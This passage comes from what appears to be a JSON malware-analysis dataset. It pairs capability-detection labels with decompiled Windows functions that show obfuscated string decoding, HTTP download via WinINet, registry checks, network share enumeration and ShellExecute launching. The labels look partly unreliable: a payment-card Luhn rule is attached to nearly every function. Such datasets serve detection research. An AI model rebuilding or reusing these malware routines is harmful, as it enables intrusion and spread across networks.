        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004072f5(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpString1;\n    uint var_18h;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    iVar1 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    if (-1 < iVar1) {\n        iVar1 = (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 6, 3, 0, 0, 0);\n        if (-1 < iVar1) {\n            ppv = NULL;\n            iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x417728, 0, 1, 0x417518, &ppv);\n            if ((-1 < iVar1) && (ppv != NULL)) {\n                var_18h._0_2_ = 0;\n                var_18h._2_2_ = 0;\n                uStack24 = 0;\n                uStack22 = 0;\n                uStack20 = 0;\n                uStack18 = 0;\n                uStack16 = 0;\n                uStack14 = 0;\n                iVar1 = (**(*ppv + 0x28))(ppv, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\n                if (-1 < iVar1) {\n                    uVar2 = fcn.0040acd8(0x418658, 1, 0xf163d155);\n                    uVar2 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(uVar2);\n                    var_8h = NULL;\n                    iVar1 = (**(*ppv + 0x1c))(ppv, uVar2, &var_8h);\n                    if ((-1 < iVar1) && (var_8h != NULL)) {\n                        uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(0x41dc10);\n                        (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, uVar3);\n                        (*_sym.imp.SHLWAPI.dll_PathRemoveExtensionW)(&lpString1);\n                        (**(*var_8h + 0x3c))(var_8h, &lpString1, 0);\n                        (**(*var_8h + 8))(var_8h);\n                    }\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar2);\n                }\n                (**(*ppv + 8))(ppv);\n            }\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return;\n}\n",
        "token_count": 671
    },
    "00407d1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d1a(int32_t *arg_8h, int32_t *arg_ch, uint lpString2, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString2);\n    *in_EAX = (*in_EAX - arg_14h) + uVar3;\n    if (arg_14h < uVar3) {\n        iVar1 = *arg_ch;\n        iVar2 = *arg_8h;\n        iVar4 = fcn.0040ae72();\n        *arg_8h = iVar4;\n        *arg_ch = iVar4 + (iVar1 - iVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(*arg_ch, lpString2);\n    *arg_ch = *arg_ch + uVar3;\n    return;\n}\n",
        "token_count": 230
    },
    "00408657": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "parse URL",
            "contain loop",
            "send data",
            "send HTTP request",
            "create HTTP request",
            "connect to HTTP server",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408657(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint s2;\n    uint var_350h;\n    uint var_150h;\n    uint var_4ch;\n    uint s;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_20h;\n    uint var_1ch;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t n;\n    \n    iVar4 = 0;\n    sub.ntdll.dll_memset(&s, 0, 0x38);\n    var_3ch = &var_150h;\n    var_20h = &var_350h;\n    var_4ch = 0x3c;\n    var_38h = 0x100;\n    var_1ch = 0x200;\n    (*_sym.imp.WININET.dll_InternetCrackUrlA)(arg_8h, 0, 0x10000000, &var_4ch);\n    var_10h = (*_sym.imp.WININET.dll_InternetOpenA)(0, 0, 0, 0, 0);\n    if (var_10h != 0) {\n        var_ch = (*_sym.imp.WININET.dll_InternetConnectA)(var_10h, &var_150h, var_34h, 0, 0, 3, 0, 0);\n        if (var_ch != 0) {\n            uVar1 = fcn.0040a88f(0x418870, 3, 0x4d6079fc, 0);\n            var_8h = (*_sym.imp.WININET.dll_HttpOpenRequestA)(var_ch, uVar1, &var_350h, 0, 0, 0, 0, 0);\n            if (var_8h != 0) {\n                iVar2 = (*_sym.imp.WININET.dll_HttpSendRequestA)(var_8h, 0, 0, 0, 0);\n                if (iVar2 != 0) {\n                    if (arg_ch == NULL) {\n                        iVar4 = 1;\n                    }\n                    else {\n                        iVar2 = 0;\n                        while( true ) {\n                            iVar3 = (*_sym.imp.WININET.dll_InternetReadFile)(var_8h, &s2, 0x400, &n);\n                            if ((iVar3 == 0) || (n == 0)) break;\n                            iVar4 = fcn.0040ae72();\n                            sub.ntdll.dll_memcpy(iVar2 + iVar4, &s2, n);\n                            iVar2 = iVar2 + n;\n                        }\n                        *arg_ch = iVar2;\n                    }\n                }\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(var_8h);\n            }\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(var_ch);\n        }\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_10h);\n    }\n    return iVar4;\n}\n",
        "token_count": 721
    },
    "004087a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004087a4(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (*0x41e3f8 == 0) {\n        uVar1 = fcn.0040a88f(0x418874, 6, 0x621459bc, 0);\n        iVar2 = fcn.00415506(uVar1);\n        if (iVar2 != 0) {\n            uVar3 = fcn.004154a9();\n            var_4h = 0;\n            if (uVar3 != 0) {\n                do {\n                    iVar2 = fcn.004154d0(var_4h);\n                    if (iVar2 != 0) {\n                        uVar1 = fcn.0040a88f(0x41887c, 3, 0x4d2049a5, 0);\n                        fcn.00415506(uVar1);\n                        iVar2 = fcn.00415629();\n                        if (iVar2 != 0) {\n                            uVar1 = fcn.0040a88f(0x418880, 0xd, 0x9ee6eb97, 0);\n                            fcn.00415506(uVar1);\n                            iVar4 = fcn.00415629();\n                            if (iVar4 != 0) {\n                                var_8h = 0;\n                                iVar2 = fcn.00408657(iVar2, &var_8h);\n                                if (iVar2 != 0) {\n                                    iVar2 = fcn.004156e4(iVar2, &var_8h);\n                                    fcn.0040af12();\n                                    if (iVar2 != 0) {\n                                        fcn.00415506(iVar4);\n                                        uVar1 = fcn.00415629();\n                                        *0x41e3f8 = fcn.0040bd6e(uVar1);\n                                        fcn.004153f3();\n                                        if (*0x41e3f8 != 0) {\n                                            return;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < uVar3);\n            }\n        }\n        if (*0x41e3f8 == 0) {\n            *0x41e3f8 = fcn.0040a88f(0x418890, 2, 0xb1c520f4, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 606
    },
    "00408a6d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00408a6d(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    int64_t iVar8;\n    uint arg_10h;\n    uint var_1h;\n    \n    uVar4 = 0;\n    bVar5 = true;\n    bVar6 = true;\n    bVar7 = true;\n    uVar2 = fcn.0040a88f(0x418170, 7, 0x7fd53f7d, 0);\n    iVar3 = fcn.00415506(uVar2);\n    if ((iVar3 != 0) && (cVar1 = fcn.004089f8(),  cVar1 == '\\0')) {\n        uVar2 = fcn.0040a88f(0x4188c4, 7, 0x83861790, 0);\n        fcn.00415506(uVar2);\n        iVar8 = fcn.004155c2();\n        *0x41c697 = 1;\n        if (iVar8 == 0) {\n            *0x41c697 = 0;\n        }\n    }\n    uVar2 = fcn.0040acd8(0x4188a0, 0x18, 0xa296fc14);\n    iVar3 = fcn.0040cbc0(uVar2);\n    if (iVar3 == 0) {\n        uVar2 = fcn.0040a88f(0x4187e8, 5, 0x51c9fd1e, 0);\n        iVar3 = fcn.00415506(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = fcn.0040a88f(0x4188cc, 6, 0x9fc22c81, 0);\n            fcn.00415506(uVar2);\n            iVar8 = fcn.004155c2();\n            bVar5 = iVar8 != 0;\n            uVar2 = fcn.0040a88f(0x4188d4, 7, 0x64a9cd9e, 0);\n            fcn.00415506(uVar2);\n            iVar8 = fcn.004155c2();\n            bVar6 = iVar8 != 0;\n            uVar2 = fcn.0040a88f(0x4188dc, 8, 0x60c3d9a2, 0);\n            fcn.00415506(uVar2);\n            iVar8 = fcn.004155c2();\n            bVar7 = iVar8 != 0;\n            uVar2 = fcn.0040a88f(0x4188e8, 8, 0xfcfc5f63, 0);\n            fcn.00415506(uVar2);\n            *0x41de20 = fcn.004155c2();\n            *0x41de20 = *0x41de20 * 0x3c;\n        }\n        uVar2 = fcn.0040a88f(0x4186c8, 7, 0x602a3a93, 0);\n        iVar3 = fcn.00415506(uVar2);\n        if (iVar3 == 0) goto code_r0x00408c68;\n        uVar2 = fcn.0040a88f(0x4186d0, 10, 0x2f12fc5b, 0);\n        iVar3 = fcn.00415506(uVar2);\n        if (iVar3 == 0) goto code_r0x00408c68;\n        uVar2 = fcn.0040a88f(0x4188f4, 9, 0xbcd5ca3b, 0);\n        fcn.00415506(uVar2);\n        iVar8 = fcn.004155c2();\n        if (iVar8 != 0) {\n            *0x41c6b2 = 1;\n            goto code_r0x00408c68;\n        }\n    }\n    else {\n        bVar5 = false;\n        bVar6 = false;\n        bVar7 = false;\n        *0x41de20 = 0;\n    }\n    *0x41c6b2 = 0;\ncode_r0x00408c68:\n    cVar1 = fcn.004089f8();\n    if (cVar1 == '\\0') {\n        if ((bVar5) && (iVar3 = fcn.00402c29(),  iVar3 != 0)) {\n            arg_10h = 0x9e4855a8;\n            uVar2 = 0x418900;\n        }\n        else if ((bVar7) && (cVar1 = fcn.00408553(unaff_EDI),  cVar1 == '\\0')) {\n            arg_10h = 0x177f8bd3;\n            uVar2 = 0x418904;\n        }\n        else {\n            if ((!bVar6) || (cVar1 = fcn.004088ff(),  cVar1 != '\\0')) {\n                return 1;\n            }\n            arg_10h = 0xf3909d64;\n            uVar2 = 0x418908;\n        }\n        *0x41bb40 = fcn.0040a88f(uVar2, 1, arg_10h, 0);\n    }\n    else {\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1275
    },
    "00408ce7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00408ce7(uint param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint hKey;\n    \n    uVar3 = 0;\n    uVar1 = fcn.0040a605(param_1, 0, 0, 0, 0x20119, 0, &hKey, 0);\n    uVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, uVar1);\n    if (uVar2 == 0) {\n        var_8h = 0;\n        var_ch = 4;\n        uVar1 = fcn.0040acd8(0x41890c, 9, 0x7d73e920, 0, 0, &var_8h, &var_ch);\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar1);\n        uVar2 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar3 = var_8h == 0;\n    }\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 289
    },
    "00408d5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408d5b(uint param_1)\n\n{\n    uint lpValueName;\n    uint lpSubKey;\n    uint dwType;\n    uint *lpData;\n    uint cbData;\n    uint var_4h;\n    \n    cbData = 4;\n    lpData = &var_4h;\n    dwType = 4;\n    var_4h = 1;\n    lpValueName = fcn.0040acd8(0x41890c, 9, 0x7d73e920, param_1);\n    lpSubKey = fcn.0040a605();\n    fcn.0040a731(0x80000001, lpSubKey, lpValueName, dwType, lpData, cbData);\n    return;\n}\n",
        "token_count": 171
    },
    "00408d9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nvoid fcn.00408d9a(void)\n\n{\n    uint uVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    uint var_210h;\n    uint var_4h;\n    \n    fcn.0040f47b();\n    fcn.004072f5();\n    uVar1 = fcn.0040acd8(0x418918, 7, 0x6d56fc63, &var_210h, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(uVar1);\n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(0x41dc10, 0x41dc10);\n    arg_8h = fcn.0040acd8(0x418920, 0x4d, 0x7bf6fb32);\n    iVar2 = fcn.0040beef(arg_8h, uVar1);\n    if (iVar2 != 0) {\n        fcn.0040c6b4(&var_210h, var_4h);\n        (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 0x3005, 0x41dc10, 0);\n        fcn.0040af12();\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "00408e33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e33(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint pExecInfo;\n    uint s;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    int32_t hHandle;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x38);\n    pExecInfo = 0x3c;\n    s = 0xc640;\n    cVar1 = fcn.00408ec8();\n    if (cVar1 == '\\0') {\n        uVar5 = 0x80a0b55c;\n        uVar4 = 4;\n        uVar3 = 0x418970;\n    }\n    else {\n        uVar5 = 0x4d3fe08e;\n        uVar4 = 5;\n        uVar3 = 0x418240;\n    }\n    var_30h = fcn.0040acd8(uVar3, uVar4, uVar5);\n    var_2ch = arg_8h;\n    var_28h = arg_ch;\n    var_20h = 0;\n    var_34h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    if ((iVar2 != 0) && (hHandle != 0)) {\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n        fcn.0040c13c();\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "00408ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00408ec8(void)\n\n{\n    uint var_120h;\n    uint32_t var_11ch;\n    \n    sub.ntdll.dll_memset(&var_11ch, 0, 0x118);\n    fcn.0040f255();\n    return 5 < var_11ch;\n}\n",
        "token_count": 70
    },
    "0040911c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040911c(uint param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    uVar4 = 0;\n    uVar1 = fcn.0040acd8(0x418a30, 0x39, 0x3630b448, param_1, &hKey);\n    uVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(0x80000002, uVar1);\n    if (uVar2 == 0) {\n        var_8h = 4;\n        uVar1 = fcn.0040acd8(0x418a6c, 9, 0xcf5b237d, 0, 0, &var_ch, &var_8h);\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar1);\n        if (iVar3 == 0) {\n            uVar4 = var_ch != 0;\n        }\n        uVar2 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return uVar2 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 300
    },
    "0040974e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040974e(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x4191d8, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    while (uVar1 = *(unaff_EBP + -0x1c),  uVar1 < *0x41df5c) {\n        fcn.004096c5(*(unaff_EBP + 8));\n        uVar3 = *(unaff_EBP + 8);\n        arg_8h_00 = fcn.0040acd8(0x418abc, 5, 0xa1e9b028, uVar3, **(*0x41df4c + uVar1 * 4));\n        iVar2 = fcn.0040beef(arg_8h_00, uVar3);\n        if (iVar2 != 0) {\n            *(unaff_EBP + -4) = 0;\n            uVar3 = fcn.0040acd8(0x418ac4, 4, 0x615f5018, *(unaff_EBP + -0x20), 0, *(unaff_EBP + 8), 1);\n            uVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)(uVar3);\n            (*_sym.imp.SHELL32.dll_ShellExecuteW)(uVar3);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0040af12();\n        }\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 1;\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 492
    },
    "00409b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00409b70(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uVar1 = fcn.0040a88f(0x418b38, 7, 0xf912aa3d, 0);\n    iVar2 = fcn.00415506(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x418b40, 0xd, 0x56f6fdd6, 0);\n        fcn.00415506(uVar1);\n        *0x41df48 = fcn.00415629();\n        uVar1 = fcn.0040a88f(0x418af4, 5, 0x278cf954, 0);\n        iVar2 = fcn.00415506(uVar1);\n        if (iVar2 != 0) {\n            uVar3 = fcn.004154a9();\n            uStack20 = 0;\n            if (uVar3 != 0) {\n                do {\n                    iVar2 = fcn.004154d0(uStack20);\n                    if (iVar2 != 0) {\n                        uVar4 = fcn.004154a9();\n                        uStack24 = 0;\n                        if (uVar4 != 0) {\n                            do {\n                                uVar1 = fcn.00415325(4);\n                                uVar5 = fcn.004154d0(uStack24);\n                                fcn.00415468(uVar5, 1);\n                                iVar2 = fcn.00409ab5(uVar1, 0);\n                                if (iVar2 != 0) {\n                                    *0x41df58 = fcn.0040ae72();\n                                    iVar6 = *0x41df54;\n                                    *0x41df54 = *0x41df54 + 1;\n                                    *(*0x41df58 + iVar6 * 4) = iVar2;\n                                }\n                                fcn.004153f3();\n                                uStack24 = uStack24 + 1;\n                            } while (uStack24 < uVar4);\n                        }\n                    }\n                    uStack20 = uStack20 + 1;\n                } while (uStack20 < uVar3);\n            }\n        }\n    }\n    fcn.0040982e(param_1);\n    uVar1 = fcn.0040a88f(0x418b50, 9, 0x8b315b8a, 0);\n    iVar2 = fcn.00415506(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x418af4, 5, 0x278cf954, 0);\n        iVar2 = fcn.00415506(uVar1);\n        if (iVar2 != 0) {\n            uStack20 = 0;\n            if (*0x41df5c != 0) {\n                do {\n                    iVar6 = fcn.0040d55a(**(*0x41df4c + uStack20 * 4));\n                    if (iVar6 != 0) {\n                        uVar1 = fcn.00415350(iVar6);\n                        fcn.00415468(uVar1, 0);\n                        fcn.0040af12();\n                    }\n                    uStack20 = uStack20 + 1;\n                } while (uStack20 < *0x41df5c);\n            }\n            *0x41df40 = fcn.00409ab5(iVar2, 2);\n        }\n        uVar1 = fcn.0040a88f(0x418b5c, 7, 0x936ca382, 0);\n        iVar2 = fcn.00415506(uVar1);\n        if (iVar2 != 0) {\n            *0x41e16c = fcn.00409ab5(iVar2, 1);\n        }\n    }\n    uVar1 = fcn.0040a88f(0x418b64, 9, 0xe6c72e4e, 0);\n    iVar2 = fcn.00415506(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x418b5c, 7, 0x936ca382, 0);\n        iVar2 = fcn.00415506(uVar1);\n        if (iVar2 != 0) {\n            *0x41df50 = fcn.00409ab5(iVar2, 1);\n        }\n    }\n    if ((*0x41df48 == 0) || (*0x41df58 == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 1120
    },
    "00409f29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409f29(uint arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(2, 1, 0x13, arg_8h, &var_8h);\n    if (iVar1 == 0) {\n        var_4h = 0xffffffff;\n        uVar3 = 0;\n        var_ch = 800;\n        iVar1 = fcn.0040ae05(0);\n        if (((iVar1 != 0) &&\n            (iVar2 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(var_8h, &var_4h, iVar1, &var_ch),  iVar2 == 0)) &&\n           (var_4h != 0)) {\n            puVar4 = iVar1 + 0x14;\n            do {\n                if ((*(puVar4 + -2) & 2) == 0) {\n                    (*arg_ch)(*puVar4);\n                }\n                else {\n                    fcn.00409f29(puVar4 + -5, arg_ch, arg_10h);\n                }\n                uVar3 = uVar3 + 1;\n                puVar4 = puVar4 + 8;\n            } while (uVar3 < var_4h);\n        }\n        fcn.0040af12();\n        (*_sym.imp.MPR.dll_WNetCloseEnum)(var_8h);\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "00409fbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\nvoid fcn.00409fbf(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t *unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (unaff_ESI[1] < 0x10) {\n        (*_sym.imp.KERNEL32.dll_VirtualAlloc)(unaff_ESI[3] + unaff_ESI[1], *unaff_ESI, 0x1000, 4);\n        unaff_ESI[1] = unaff_ESI[1] + *unaff_ESI;\n    }\n    puVar1 = unaff_ESI[3];\n    puVar1[2] = param_1;\n    puVar1[1] = unaff_EDI[1];\n    *puVar1 = *unaff_EDI;\n    puVar1[3] = param_2;\n    unaff_ESI[3] = unaff_ESI[3] + 0x10;\n    unaff_ESI[1] = unaff_ESI[1] + -0x10;\n    return;\n}\n",
        "token_count": 242
    },
    "0040a1f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a1f2(uint param_1, uint param_2)\n\n{\n    fcn.0040a06d(param_1, fcn.0040a005, param_2, 0, 0);\n    return;\n}\n",
        "token_count": 57
    },
    "0040a20c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a20c(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_ESI;\n    \n    *0x41df44 = *0x41df44 + 1;\n    if (*unaff_ESI == unaff_ESI[1]) {\n        unaff_ESI[1] = unaff_ESI[1] + 1000;\n        iVar1 = fcn.0040ae72();\n        unaff_ESI[2] = iVar1;\n    }\n    uVar2 = fcn.0040af95(param_1, 0x10);\n    *(unaff_ESI[2] + *unaff_ESI * 4) = uVar2;\n    *unaff_ESI = *unaff_ESI + 1;\n    return;\n}\n",
        "token_count": 186
    },
    "0040a249": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a249(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    int32_t arg_ch_00;\n    bool bVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    do {\n        puVar5 = *(arg_8h + ((arg_ch + arg_10h) / 2) * 4);\n        uVar1 = *puVar5;\n        uVar2 = puVar5[1];\n        iVar6 = arg_10h;\n        arg_ch_00 = arg_ch;\n        do {\n            puVar5 = *(arg_8h + arg_ch_00 * 4);\n            bVar7 = puVar5[1] < uVar2;\n            if (!bVar7) {\n                if (bVar7 || puVar5[1] == uVar2) goto code_r0x0040a28a;\n                do {\n                    do {\n                        arg_ch_00 = arg_ch_00 + 1;\n                        puVar5 = *(arg_8h + arg_ch_00 * 4);\n                        bVar7 = puVar5[1] < uVar2;\n                    } while (!bVar7 && puVar5[1] != uVar2);\n                    if (bVar7) break;\ncode_r0x0040a28a:\n                } while (uVar1 < *puVar5);\n            }\n            puVar5 = *(arg_8h + iVar6 * 4);\n            bVar7 = uVar2 <= puVar5[1];\n            if (!bVar7 || puVar5[1] == uVar2) {\n                if (bVar7) goto code_r0x0040a2a6;\n                do {\n                    do {\n                        iVar6 = iVar6 + -1;\n                        puVar5 = *(arg_8h + iVar6 * 4);\n                        bVar7 = puVar5[1] < uVar2;\n                    } while (bVar7);\n                    if (!bVar7 && puVar5[1] != uVar2) break;\ncode_r0x0040a2a6:\n                } while (*puVar5 < uVar1);\n            }\n            if (iVar6 < arg_ch_00) break;\n            puVar5 = *(arg_8h + arg_ch_00 * 4);\n            puVar3 = *(arg_8h + iVar6 * 4);\n            uVar4 = puVar5[1];\n            bVar7 = uVar4 < puVar3[1];\n            if ((bVar7 || uVar4 == puVar3[1]) && ((bVar7 || (*puVar5 < *puVar3)))) {\n                *(arg_8h + iVar6 * 4) = puVar5;\n                *(arg_8h + arg_ch_00 * 4) = puVar3;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            iVar6 = iVar6 + -1;\n        } while (arg_ch_00 <= iVar6);\n        if (arg_ch_00 < arg_10h) {\n            fcn.0040a249(arg_8h, arg_ch_00, arg_10h);\n        }\n        arg_10h = iVar6;\n        if (iVar6 <= arg_ch) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 793
    },
    "0040a2f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a2f7(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        fcn.0040a249(param_1[2], 0, *param_1 + -1);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1, param_1);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "0040a6f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040a6f9(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t lpString;\n    uint uVar1;\n    \n    uVar1 = 0;\n    lpString = fcn.0040a66b(0x80000002, param_1, param_2, param_3);\n    if (lpString != 0) {\n        uVar1 = fcn.0040d55a(lpString);\n        fcn.0040af12();\n    }\n    return uVar1;\n}\n",
        "token_count": 124
    },
    "0040a78b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
